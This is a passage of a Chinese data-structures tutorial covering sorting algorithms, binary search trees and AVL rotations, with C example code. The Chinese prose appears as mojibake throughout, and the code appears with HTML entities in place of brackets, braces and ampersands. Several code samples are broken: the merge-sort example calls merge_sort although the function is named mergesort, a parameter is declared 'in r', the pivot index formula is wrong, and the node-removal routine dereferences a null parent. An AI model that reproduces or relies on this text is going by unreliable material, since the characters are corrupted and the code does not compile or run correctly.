æ˜¯éšæ„æ’åºçš„ï¼Œåªè¦æ‰¾åˆ°å¯¹åº”çš„å—å°±èƒ½ç›´æ¥è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œè€Œä¸ç”¨å¤§é‡ç§»åŠ¨å…¶å®ƒçš„å…ƒç´ ï¼Œå› æ­¤å®ƒé€‚ç”¨äºçº¿æ€§è¡¨éœ€è¦é¢‘ç¹çš„åŠ¨æ€å˜åŒ–çš„æƒ…å†µã€‚ åˆ†å—æŸ¥æ‰¾çš„ç¼ºç‚¹åˆ™åœ¨äºå®ƒéœ€è¦ä¸€å®šçš„å†…å­˜ç©ºé—´æ¥å­˜æ”¾ç´¢å¼•è¡¨å¹¶ä¸”è¦æ±‚å¯¹ç´¢å¼•è¡¨è¿›è¡Œæ’åºã€‚ C++ STLä¸­çš„dequeå°±æ˜¯ä½¿ç”¨è¿™ç§åˆ†å—çš„â€œè¿ç»­â€ç»“æ„è®¾è®¡æ€è·¯ã€‚ æ’åº æ ¹æ®ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼Œå¯ä»¥å°†æ’åºç®—æ³•åˆ†ä¸ºå¤æ‚åº¦ä¸º \\(O(n^2),\\ O(n\\log(n)),\\ O(n)\\)ç­‰æ—¶é—´å¤æ‚åº¦çš„æ’åºç®—æ³•ã€‚æ¯”å¦‚ \\(O(n)\\) çš„ åŸºæ•°æ’åºï¼ˆradix sortï¼‰ã€ \\(O(n\\log(n))\\)çš„å½’å¹¶æ’åºã€\\(O(n^2)\\)çš„å†’æ³¡æ’åºã€‚ æ ¹æ®æ’åºè¿‡ç¨‹ä¸­å…ƒç´ æ˜¯å¦å®Œå…¨ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥å°†ç®—æ³•åˆ†ä¸º å†…éƒ¨æ’åºï¼ˆinternal sortï¼‰ å’Œ å¤–éƒ¨æ’åºï¼ˆexternal sortï¼‰ ã€‚ å¯¹äºä¸€ä¸ªæ’åºç®—æ³•ï¼Œå¦‚æœä»»æ„ä¸¤ä¸ªå…ƒç´  \\(a_i\\) å’Œ \\(a_j\\) åœ¨æ’åºå‰çš„çº¿æ€§è¡¨ä¸­æ»¡è¶³æ¡ä»¶ i&lt;j ä¸” \\(a_i = a_j\\)ï¼Œåœ¨æ’åºå \\(a_i\\) ä»åœ¨ \\(a_j\\) ä¹‹å‰ï¼Œåˆ™ç§°è¿™ä¸ªæ’åºç®—æ³•ä¸º ç¨³å®šæ’åºï¼ˆstable sortï¼‰ (æ¯”å¦‚æ’å…¥ã€å†’æ³¡ã€å½’å¹¶)ï¼Œå¦åˆ™ç§°è¿™ä¸ªæ’åºç®—æ³•ä¸º ä¸ç¨³å®šæ’åº(unstable sort) ï¼ˆé€‰æ‹©ã€å¿«é€Ÿã€å †ã€å¸Œå°”æ’åºï¼‰ã€‚ æ’å…¥æ’åº å°†çº¿æ€§è¡¨åˆ†ä¸ºå·²æ’åºçš„å‰åŠéƒ¨åˆ†å’Œå¾…æ’åºçš„ååŠéƒ¨åˆ†ï¼Œä»å¾…æ’åºéƒ¨åˆ†é€‰å‡ºç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ’å…¥åˆ°å·²æ’åºéƒ¨åˆ†çš„å¯¹åº”ä½ç½®ä¸­ï¼Œç›´åˆ°å…¨éƒ¨è®°å½•éƒ½æ’å…¥åˆ°å·²æ’åºéƒ¨åˆ†ä¸­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void sort(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; for (int j = i - 1; j &gt;= 0; --j) &#123; if (data[j] &gt; data[j + 1]) &#123; swap(&amp;data[j], &amp;data[j + 1]); &#125; else &#123; break; &#125; &#125; &#125;&#125;void sort_better(int *data, int length) &#123; int cur; for (int i = 1; i &lt; length; i++) &#123; cur = data[i]; int j = i - 1; while (j &gt;= 0 &amp;&amp; data[j] &gt; cur) &#123; data[j + 1] = data[j]; j--; &#125; data[j + 1] = cur; &#125;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; sort(arr, n); print(arr, n); return 0;&#125; å†’æ³¡æ’åº ä»å‰å¾€åä¸¤ä¸¤æ¯”è¾ƒç›¸é‚»å…ƒç´ çš„å…³é”®å­—ï¼Œ æŒ‰ç…§ç›®æ ‡å¤§å°é¡ºåºè¿›è¡Œäº¤æ¢å…ƒç´ ï¼Œæ¯è¶Ÿäº¤æ¢ä»¥åæœ€åä¸€ä¸ªå…ƒç´ ä¸€å®šæ˜¯æœ€å¤§çš„ï¼Œä¸å†å‚ä¸ä¸‹ä¸€è¶Ÿäº¤æ¢ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void sort(int *data, int length) &#123; for (int i = 0; i &lt; length - 1; ++i) &#123; int swapped = 0; for (int j = 0; j &lt; length - i - 1; ++j) &#123; if (data[j] &gt; data[j + 1]) &#123; swap(&amp;data[j], &amp;data[j + 1]); swapped = 1; &#125; &#125; if (swapped == 0) &#123; break; &#125; &#125;&#125;void sort_better(int *data, int len) &#123; int isSorted = 0; do &#123; isSorted = 1; len--; for (int i=0; i&lt;len; ++i) &#123; if (data[i] &gt; data[i+1]) &#123; isSorted = 0; swap(&amp;data[i], &amp;data[i+1]); &#125; &#125; &#125; while (!isSorted);&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; sort(arr, n); print(arr, n); return 0;&#125; å½’å¹¶æ’åº è®¾æ³•å°†ä¸¤ä¸ªæœ‰åºçš„çº¿æ€§è¡¨ç»„åˆæˆä¸€ä¸ªæ–°çš„æœ‰åºçº¿æ€§è¡¨ã€‚ä¸ºäº†å®ç°å½’å¹¶æ“ä½œï¼Œæ¯æ¬¡åˆå¹¶éƒ½éœ€è¦å¼€è¾Ÿé¢å¤–çš„ç©ºé—´æ¥ä¸´æ—¶ä¿å­˜åˆå¹¶åçš„æ’åºç»“æœï¼Œæ€»å…±éœ€è¦å¼€è¾Ÿ n ä¸ªå…ƒç´ çš„ç©ºé—´ï¼Œæ‰€ä»¥å½’å¹¶æ’åºçš„ç©ºé—´å¤æ‚åº¦ä¸º \\(O(n)\\)ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void mergesort(int *data, int l, int r) &#123; if (l == r) return; int mid = (l + r) / 2; mergesort(data, l, mid); mergesort(data, mid + 1, r); int temp[r - l + 1]; // æˆ–è€…ä»å †åˆ†é…ç©ºé—´ int x = l, y = mid + 1, loc = 0; while (x &lt;= mid || y &lt;= r) &#123; if (x &lt;= mid &amp;&amp; (y &gt; r || data[x] &lt;= data[y])) temp[loc] = data[x++]; else temp[loc] = data[y++]; loc++; &#125; for (int i = l; i &lt;= r; i++) &#123; data[i] = temp[i - l]; &#125;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; merge_sort(arr, 0, n - 1); print(arr, n); return 0;&#125; é€‰æ‹©æ’åº é€‰æ‹©æ’åºï¼Œæ¯è¶Ÿä»çº¿æ€§è¡¨çš„å¾…æ’åºåŒºåŸŸé€‰å–å…³é”®å­—æœ€å°çš„å…ƒç´ ï¼Œå°†å…¶æ”¾åˆ°å·²æ’åºåŒºåŸŸçš„æœ€åã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;inline void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void sort(int *data, int length) &#123; int temp; for (int i = 0; i &lt; length - 1; ++i) &#123; temp = i; for (int j = i + 1; j &lt; length; ++j) &#123; if (data[temp] &gt; data[j]) &#123; temp = j; &#125; &#125; if (i != temp) &#123; swap(&amp;data[i], &amp;data[temp]); &#125; &#125;&#125;void sort_better(int *data, int len) &#123; if (len &lt;= 1) return; register int *last = data + len - 1, *p, *minPtr; for ( ; data &lt; last; ++data) &#123; minPtr = data; for (p = data + 1; p &lt;= last; ++p) &#123; if (*p &lt; *minPtr) minPtr = p; &#125; swap(minPtr, data); &#125;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; sort(arr, n); print(arr, n); return 0;&#125; åœ¨æ¯æ¬¡æŸ¥æ‰¾å…³é”®å­—æœ€å°çš„å…ƒç´ æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å †å¯¹æ•ˆç‡è¿›è¡Œä¼˜åŒ–ï¼Œä½¿ç”¨å †æ¥ä¼˜åŒ–çš„é€‰æ‹©æ’åºå°±æ˜¯å †æ’åºã€‚ å¿«é€Ÿæ’åº å¿«é€Ÿæ’åºæ˜¯ç›®å‰åº”ç”¨æœ€å¹¿æ³›çš„æ’åºç®—æ³•ä¹‹ä¸€ã€‚å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼Œæ¯æ¬¡ä»å¾…æ’åºåŒºé—´é€‰å–ä¸€ä¸ªå…ƒç´ ï¼ˆåœ¨åé¢çš„è¯¾ç¨‹ä¸­éƒ½æ˜¯é€‰å–ç¬¬ä¸€ä¸ªï¼‰ä½œä¸ºåŸºå‡†è®°å½•ï¼Œæ‰€æœ‰æ¯”åŸºå‡†è®°å½•å°çš„å…ƒç´ éƒ½åœ¨åŸºå‡†è®°å½•çš„å·¦è¾¹ï¼Œè€Œæ‰€æœ‰æ¯”åŸºå‡†è®°å½•å¤§çš„å…ƒç´ éƒ½åœ¨åŸºå‡†è®°å½•çš„å³è¾¹ã€‚ä¹‹ååˆ†åˆ«å¯¹åŸºå‡†è®°å½•çš„å·¦è¾¹å’Œå³è¾¹ä¸¤ä¸ªåŒºé—´è¿›è¡Œå¿«é€Ÿæ’åºï¼Œç›´è‡³å°†æ•´ä¸ªçº¿æ€§è¡¨æ’åºå®Œæˆã€‚ quick_sort_better å®ç°äº†å•è¾¹é€’å½’ï¼Œå°†ä¸¤ä¸ªé€’å½’å‡½æ•°ï¼Œä¼˜åŒ–æˆä¸€ä¸ªã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;stdio.h&gt;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void print(int *data, int length) &#123; for (int i = 0; i &lt; length; ++i) &#123; if (i &gt; 0) &#123; printf(\" \"); &#125; printf(\"%d\", data[i]); &#125; printf(\"\\n\");&#125;void quick_sort(int *data, int left, int right) &#123; if (left &gt; right) &#123; return; &#125; int pivot = data[left], low = left, high = right; while (low &lt; high) &#123; while (low &lt; high &amp;&amp; data[high] &gt;= pivot) &#123; high--; &#125; data[low] = data[high]; while (low &lt; high &amp;&amp; data[low] &lt;= pivot) &#123; low++; &#125; data[high] = data[low]; &#125; data[low] = pivot; quick_sort(data, left, low - 1); quick_sort(data, low + 1, right);&#125;// quick sort ä¼˜åŒ–void quick_sort_better(int *data, int l, in r) &#123; if (l &gt;= r) return; while (l &lt; r) &#123; int x = l, y = r, pivot = data[(x + (y - x)) / 2]; while (x &lt;= y) &#123; while (data[x] &lt; pivot) ++x; while (data[y] &gt; pivot) --y; if (x &lt;= y) &#123; swap(&amp;data[x++], &amp;data[y--]); &#125; &#125; quick_sort_better(data, l, y); l = x; // ç›´æ¥åœ¨å½“å‰å‡½æ•°å†…ï¼Œå¿«æ’ååŠéƒ¨åˆ† &#125; return;&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); int arr[n]; for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;arr[i]); &#125; quick_sort(arr, 0, n - 1); print(arr, n); return 0;&#125; äºŒå‰æŸ¥æ‰¾æ ‘ å¯¹ä»»æ„ç»“ç‚¹ï¼Œå¦‚æœå·¦å­æ ‘ä¸ä¸ºç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„æƒå€¼éƒ½å°äºè¯¥ç»“ç‚¹çš„æƒå€¼ï¼›å¦‚æœå³å­æ ‘ä¸ä¸ºç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„æƒå€¼éƒ½å¤§äºè¯¥ç»“ç‚¹çš„æƒå€¼ã€‚ å¦‚æœä¸­åºéå†äºŒå‰æŸ¥æ‰¾æ ‘ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªä»å°åˆ°å¤§çš„åºåˆ—ã€‚ åœ¨äºŒå‰æŸ¥æ‰¾æ ‘çš„åŸºç¡€ä¸Šå¯ä»¥åŠ äº›ä¼˜åŒ–ï¼Œå¯ä»¥è®©å…¶æˆä¸º AVL æ ‘ï¼Œçº¢é»‘æ ‘ï¼ŒSBTï¼ŒSplay ç­‰ç­‰ï¼Œè¿™äº›é«˜çº§çš„æ ‘ç»“æ„è§£å†³äº†äºŒå‰æ ‘é€€åŒ–çš„é—®é¢˜ã€‚ æ’å…¥è¿‡ç¨‹ï¼š æ ¹èŠ‚ç‚¹ä¸ºç©ºåˆ™æ–°å…ƒç´ ç›´æ¥ä½œä¸ºæ ¹èŠ‚ç‚¹ï¼Œå¦åˆ™ä¼ å…¥çš„å‚æ•° value ä¸æ ¹èŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒã€‚ value ç­‰äºå½“å‰èŠ‚ç‚¹åˆ™ç›´æ¥è¿”å›ï¼Œå°äºåˆ™è·³è½¬åˆ°æ­¥éª¤ 3ï¼Œè€Œå¦‚æœ value å¤§äºå½“å‰èŠ‚ç‚¹æ—¶ï¼Œè·³è½¬åˆ°æ­¥éª¤ 4ã€‚ åˆ¤æ–­å½“å‰èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨å·¦å­©å­ï¼Œå¦‚æœå­˜åœ¨åˆ™è®©å…¶å·¦å­©å­ç»§ç»­è°ƒç”¨æ’å…¥æ–¹æ³•ï¼Œå›åˆ°æ­¥éª¤ 2ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å°†æ–°å…ƒç´ æ’å…¥åˆ°å½“å‰èŠ‚ç‚¹çš„å·¦å­©å­ä½ç½®ä¸Šã€‚ åˆ¤æ–­å½“å‰èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨å³å­©å­ï¼Œå­˜åœ¨åˆ™è®©å…¶å³å­æ ‘ç»§ç»­è°ƒç”¨æ’å…¥æ–¹æ³•ï¼Œå›åˆ°æ­¥éª¤ 2ï¼Œä¸å­˜åœ¨åˆ™å°†æ–°å…ƒç´ æ’å…¥åˆ°å½“å‰èŠ‚ç‚¹çš„å³å­©å­ä½ç½®ä¸Šã€‚ ç®€å•å®ç°æ’å…¥å’ŒæŸ¥æ‰¾ï¼Œè¾“å‡ºä¸­åºéå†ç»“æœã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node &#123; int data; struct Node *lchild, *rchild, *father;&#125;Node;Node* init(int data, Node *father) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; node-&gt;father = father; return node;&#125;Node* insert(int value, Node *tree) &#123; if (!tree) &#123; tree = init(value, NULL); return tree; &#125; if (value &gt; tree-&gt;data) &#123; if (!tree-&gt;rchild) tree-&gt;rchild = init(value, tree); else tree-&gt;rchild = insert(value, tree-&gt;rchild); &#125; else &#123; if (!tree-&gt;lchild) tree-&gt;lchild = init(value, tree); else tree-&gt;lchild = insert(value, tree-&gt;lchild); &#125; return tree;&#125;Node* search(int value, Node *tree) &#123; if (!tree || value == tree-&gt;data) return tree; if (value &gt; tree-&gt;data) &#123; if (!tree-&gt;rchild) return NULL; else return search(value, tree-&gt;rchild); &#125; else &#123; if (!tree-&gt;lchild) return NULL; else return search(value, tree-&gt;lchild); &#125;&#125;void inorder(Node *tree) &#123; if (!tree) return; inorder(tree-&gt;lchild); printf(\"%d \", tree-&gt;data); inorder(tree-&gt;rchild);&#125;void clear(Node *node) &#123; if (node != NULL) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node); &#125;&#125;int main() &#123; Node *binarytree = NULL; init(100, binarytree); int n; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; ++i) &#123; int v; scanf(\"%d\", &amp;v); binarytree = insert(v, binarytree); &#125; int value; scanf(\"%d\", &amp;value); if (search(value, binarytree)) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; (void)inorder(binarytree); clear(binarytree); return 0;&#125; åˆ é™¤æ“ä½œ èŠ‚ç‚¹çš„å‰é©±æŒ‡çš„æ˜¯å€¼æ¯”å®ƒå°çš„èŠ‚ç‚¹ä¸­æœ€å¤§çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåç»§æ˜¯æŒ‡å€¼æ¯”å®ƒå¤§çš„èŠ‚ç‚¹ä¸­æœ€å°çš„ä¸€ä¸ªã€‚ æŸ¥æ‰¾èŠ‚ç‚¹å‰é©±çš„ç®—æ³•æµç¨‹å¦‚ä¸‹ï¼š æ‰¾åˆ°å½“å‰èŠ‚ç‚¹çš„å·¦å­©å­ï¼Œå¦‚æœå½“å‰èŠ‚ç‚¹æ²¡æœ‰å·¦å­©å­åˆ™ä¸å­˜åœ¨å‰é©±ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æ‰¾åˆ°å…¶å·¦å­©å­çš„å³å­©å­ã€‚ è‹¥å½“å‰èŠ‚ç‚¹æœ‰å³å­©å­åˆ™ç»§ç»­æ‰¾åˆ°å…¶å³å­©å­ï¼Œé‡å¤æ­¥éª¤ 2ï¼Œç›´è‡³æ‰¾åˆ°ä¸€ä¸ªèŠ‚ç‚¹ä¸å­˜åœ¨å³å­©å­æ—¶ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯è¦æŸ¥æ‰¾çš„å‰é©±ã€‚ åˆ é™¤æ“ä½œçš„ç®—æ³•æµç¨‹å¦‚ä¸‹ï¼š æ‰¾åˆ°è¢«åˆ é™¤çš„èŠ‚ç‚¹ã€‚ è‹¥å®ƒå­˜åœ¨å·¦å­©å­ï¼Œåˆ™æ‰¾åˆ°ä»–çš„å‰é©±ï¼Œç”¨å‰é©±æ›¿æ¢è¢«åˆ é™¤èŠ‚ç‚¹çš„å€¼ï¼Œå†è°ƒç”¨åˆ é™¤èŠ‚ç‚¹çš„æ–¹æ³•åˆ é™¤å‰é©±ã€‚ è‹¥è¢«åˆ é™¤èŠ‚ç‚¹ä¸å­˜åœ¨å·¦å­©å­ï¼Œåˆ™æ‰¾åˆ°å®ƒçš„åç»§ï¼Œç”¨åç»§æ›¿æ¢è¢«åˆ é™¤èŠ‚ç‚¹çš„å€¼ï¼Œå†è°ƒç”¨åˆ é™¤èŠ‚ç‚¹çš„æ–¹æ³•åˆ é™¤åç»§ã€‚ è‹¥è¢«åˆ é™¤çš„èŠ‚ç‚¹ä¸å­˜åœ¨å­©å­èŠ‚ç‚¹ï¼Œç›´æ¥è°ƒç”¨åˆ é™¤èŠ‚ç‚¹çš„çš„æ–¹æ³•åˆ é™¤å®ƒã€‚ å®ç°åˆ é™¤ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Node &#123; int data; struct Node *lchild, *rchild, *father;&#125;Node;Node* init(int _data, Node *_father) &#123; Node *node =(Node *)malloc(sizeof(Node)); node-&gt;data = _data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; node-&gt;father = _father; return node;&#125;Node* insert(Node *node, int value) &#123; if (node == NULL) &#123; node = init(value, NULL); &#125; else if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NULL) &#123; node-&gt;rchild = init(value, node); &#125; else &#123; node-&gt;rchild = insert(node-&gt;rchild, value); &#125; &#125; else if (value &lt; node-&gt;data) &#123; if (node-&gt;lchild == NULL) &#123; node-&gt;lchild = init(value, node); &#125; else &#123; node-&gt;lchild = insert(node-&gt;lchild, value); &#125; &#125; return node;&#125;Node* search(Node *node, int value) &#123; if (node == NULL || node-&gt;data == value) &#123; return node; &#125; else if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NULL) &#123; return NULL; &#125; else &#123; return search(node-&gt;rchild, value); &#125; &#125; else &#123; if (node-&gt;lchild == NULL) &#123; return NULL; &#125; else &#123; return search(node-&gt;lchild, value); &#125; &#125;&#125;Node* predecessor(Node *node) &#123; if (!node-&gt;lchild) return NULL; Node *res = node-&gt;lchild; while (res &amp;&amp; res-&gt;rchild) &#123; res = res-&gt;rchild; &#125; return res;&#125;Node* successor(Node *node) &#123; if (!node-&gt;rchild) return NULL; Node *res = node-&gt;rchild; while (res &amp;&amp; res-&gt;lchild) &#123; res = res-&gt;lchild; &#125; return res;&#125;// åˆ é™¤åº¦ä¸º1æˆ–è€…0çš„èŠ‚ç‚¹ï¼Œåœ¨delete_treeå‡½æ•°ä¸­ä½¿ç”¨ã€‚void remove_node(Node *node) &#123; if (!node) return; Node *tmp = NULL; if (node-&gt;lchild) &#123; tmp = node-&gt;lchild; tmp-&gt;father = node-&gt;father; &#125; if (node-&gt;rchild) &#123; tmp = node-&gt;rchild; tmp-&gt;father = node-&gt;father; &#125; if (node-&gt;father-&gt;lchild == node) &#123; node-&gt;father-&gt;lchild = tmp; &#125; else &#123; node-&gt;father-&gt;rchild = tmp; &#125; node-&gt;rchild = NULL; node-&gt;lchild = NULL; node-&gt;father = NULL; free(node);&#125;// æ ¹æ®è¾“å…¥å€¼åˆ é™¤èŠ‚ç‚¹int delete_tree(Node *tree, int value) &#123; if (!tree) return ERROR; Node *target = search(tree, value); if (!target) return ERROR; Node *tmp = NULL; if (target-&gt;lchild) &#123; tmp = predecessor(target); &#125; else if (target-&gt;rchild) &#123; tmp = successor(target); &#125; else &#123; tmp = target; &#125; target-&gt;data = tmp-&gt;data; remove_node(tmp); return OK;&#125;void clear(Node *node) &#123; if (node != NULL) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node); &#125;&#125;int main() &#123; Node *binarytree = NULL; int arr[10] = &#123; 8, 9, 10, 3, 2, 1, 6, 4, 7, 5 &#125;; for (int i = 0; i &lt; 10; i++) &#123; binarytree = insert(binarytree, arr[i]); &#125; int value; scanf(\"%d\", &amp;value); if (search(binarytree, value) != NULL) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; scanf(\"%d\", &amp;value); if (delete_tree(binarytree, value)) &#123; printf(\"delete success!\\n\"); &#125; else &#123; printf(\"delete failed!\\n\"); &#125; clear(binarytree); return 0;&#125; å¹³è¡¡äºŒå‰æ ‘ æ‰€æœ‰å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘åŸºæœ¬ç”±ä»¥ä¸‹ä¸‰ä¸ªç‰¹å¾ç»„æˆï¼š è‡ªå¹³è¡¡æ¡ä»¶ æ—‹è½¬æ“ä½œ æ—‹è½¬çš„è§¦å‘ å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘é€šè¿‡è®¾ç½®åˆç†çš„è‡ªå¹³è¡¡æ¡ä»¶ï¼Œä½¿å¾—äºŒå‰æŸ¥æ‰¾æ ‘çš„æŸ¥æ‰¾ã€æ’å…¥ç­‰æ“ä½œçš„æ€§èƒ½ä¸è‡³äºé€€åŒ–æˆ \\(O(n)\\). AVL æ ‘æ˜¯æœ€æ—©å‘æ˜çš„ä¸€ç§å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ã€‚ AVL AVL æ ‘æå‡ºäº†ä¸€ä¸ªæ¦‚å¿µï¼š å¹³è¡¡å› å­ï¼ˆbalance factorï¼‰ ã€‚æ¯ä¸ªç»“ç‚¹çš„å¹³è¡¡å› å­æ˜¯æŒ‡å®ƒå·¦å­æ ‘æœ€å¤§é«˜åº¦å’Œå³å­æ ‘æœ€å¤§é«˜åº¦çš„å·®ã€‚ åœ¨ AVL æ ‘ä¸­ï¼Œå¹³è¡¡å› å­ä¸º âˆ’1ã€ 0ã€ 1 çš„ç»“ç‚¹éƒ½è¢«è®¤ä¸ºæ˜¯å¹³è¡¡çš„ï¼Œè€Œå¹³è¡¡å› å­ä¸º âˆ’2ã€ 2 ç­‰å…¶ä»–å€¼çš„ç»“ç‚¹è¢«è®¤ä¸ºæ˜¯ä¸å¹³è¡¡çš„ï¼Œéœ€è¦å¯¹è¿™ä¸ªç»“ç‚¹æ‰€åœ¨å­æ ‘è¿›è¡Œè°ƒæ•´ã€‚ æ—‹è½¬ åœ¨ AVL æ ‘ä¸­ï¼Œä¸€å…±æœ‰ä¸¤ç§å•æ—‹æ“ä½œï¼šå·¦æ—‹å’Œå³æ—‹ã€‚AVL æ ‘é€šè¿‡ä¸€ç³»åˆ—å·¦æ—‹å’Œå³æ—‹æ“ä½œï¼Œå°†ä¸å¹³è¡¡çš„æ ‘è°ƒæ•´ä¸ºå¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ã€‚ é€šè¿‡è¿›è¡Œå·¦æ—‹æ“ä½œï¼Œä½¿å¾—åŸå…ˆçš„æ ¹ 2 å˜æˆäº†å…¶å³å­©å­ 4 çš„å·¦å­©å­ï¼Œè€Œ 4 åŸå…ˆçš„å·¦å­©å­ 3 å˜æˆäº† 2 çš„å³å­©å­ã€‚ é€šè¿‡å³æ—‹æ“ä½œï¼Œä½¿å¾—åŸå…ˆçš„æ ¹ 5 å˜æˆäº†å…¶å·¦å­©å­ 3 çš„å³å­©å­ï¼Œè€Œ 3 åŸå…ˆçš„å³å­©å­å˜æˆäº† 5 çš„å·¦å­©å­ã€‚ AVL æ ‘ä¸­è¿˜æœ‰ä¸¤ç§å¤åˆæ—‹è½¬æ“ä½œï¼ˆå³â€œå¤šæ—‹â€ï¼‰ï¼Œç”±ä¸¤æ¬¡å•æ—‹æ“ä½œç»„åˆè€Œæˆã€‚ å·¦æ—‹åŠ å³æ—‹ï¼š å³æ—‹åŠ å·¦æ—‹ï¼š æ—‹è½¬çš„è§¦å‘ åœ¨æ’å…¥ä¸€ä¸ªå…ƒç´ åä¸æ–­å›æº¯çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå› æ­¤å¯¼è‡´ç»“ç‚¹ä¸å¹³è¡¡ï¼Œåˆ™æ ¹æ®ä¸å¹³è¡¡æƒ…å†µï¼ˆä¸€å®šæ˜¯ä¸€è¾¹å­æ ‘æ¯”å¦ä¸€è¾¹å­æ ‘çš„é«˜åº¦å¤§ 2ï¼‰è¿›è¡Œå¯¹åº”çš„æ—‹è½¬ï¼š å·¦å­æ ‘æ¯”å³å­æ ‘çš„é«˜åº¦å¤§ 2ï¼š å¦‚æœæ–°å¢å…ƒç´ æ’å…¥åˆ°å·¦å„¿å­çš„å·¦å­æ ‘ä¸­ï¼Œåˆ™è¿›è¡Œå³æ—‹æ“ä½œã€‚( LL å‹è°ƒæ•´ ) å¦‚æœæ–°å¢å…ƒç´ æ’å…¥åˆ°å·¦å„¿å­çš„å³å­æ ‘ä¸­ï¼Œåˆ™è¿›è¡Œå·¦æ—‹åŠ å³æ—‹æ“ä½œã€‚ï¼ˆ LR å‹è°ƒæ•´ ï¼‰ å³å­æ ‘æ¯”å·¦å­æ ‘çš„é«˜åº¦å¤§ 2ï¼š å¦‚æœæ–°å¢å…ƒç´ æ’å…¥åˆ°å³å„¿å­çš„å³å­æ ‘ä¸­ï¼Œåˆ™è¿›è¡Œå·¦æ—‹æ“ä½œã€‚ï¼ˆ RR å‹è°ƒæ•´ ï¼‰ å¦‚æœæ–°å¢å…ƒç´ æ’å…¥åˆ°å³å„¿å­çš„å·¦å­æ ‘ä¸­ï¼Œåˆ™è¿›è¡Œå³æ—‹åŠ å·¦æ—‹æ“ä½œã€‚ï¼ˆ RL å‹è°ƒæ•´ ï¼‰ ç±»ä¼¼çš„ï¼Œåœ¨åˆ 